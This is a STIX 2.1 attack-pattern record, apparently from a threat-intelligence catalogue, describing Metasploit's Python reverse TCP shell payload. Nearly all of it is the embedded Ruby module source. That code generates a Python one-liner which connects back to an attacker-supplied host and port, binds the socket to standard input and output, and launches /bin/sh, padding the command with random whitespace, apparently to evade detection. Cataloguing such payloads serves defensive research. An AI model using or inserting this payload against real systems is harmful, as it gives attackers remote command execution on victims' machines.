{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f99e9d6b-aaee-42d1-b570-72a1a06265a3",
    "created": "2024-08-14T16:33:19.325953Z",
    "modified": "2024-08-14T16:33:19.325956Z",
    "name": "Unix Command Shell, Reverse TCP (via Python)",
    "description": "Connect back and create a command shell via Python",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_python.rb",
            "external_id": "reverse_python.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Payload::Python\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'        => 'Unix Command Shell, Reverse TCP (via Python)',\n     'Version'     => '$Revision: 1 $',\n     'Description' => 'Connect back and create a command shell via Python',\n     'Author'      => 'bcoles',\n     'License'     => MSF_LICENSE,\n     'Platform'    => 'unix',\n     'Arch'        => ARCH_CMD,\n     'Handler'     => Msf::Handler::ReverseTcp,\n     'Session'     => Msf::Sessions::CommandShell,\n     'PayloadType' => 'cmd',\n     'RequiredCmd' => 'python',\n     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }\n    ))\n    register_options(\n      [\n        OptString.new('SHELL', [ true, 'The system shell to use', '/bin/sh' ])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('PythonPath', [true, 'The path to the Python executable', 'python'])\n      ]\n    )\n  end\n\n  def generate(_opts = {})\n    return super + command_string\n  end\n\n  #\n  # Generate random whitespace\n  #\n\n  def random_padding\n    \" \"*rand(10)\n  end\n\n  #\n  # Generate command string\n  #\n\n  def command_string\n    raw_cmd = \"import socket,subprocess,os;host=\\\"#{datastore['LHOST']}\\\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\\\"#{datastore['SHELL']}\\\")\"\n    cmd = raw_cmd.gsub(/,/, \"#{random_padding},#{random_padding}\").gsub(/;/, \"#{random_padding};#{random_padding}\")\n    \"#{datastore['PythonPath']} -c \\\"#{ py_create_exec_stub(cmd) }\\\"\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}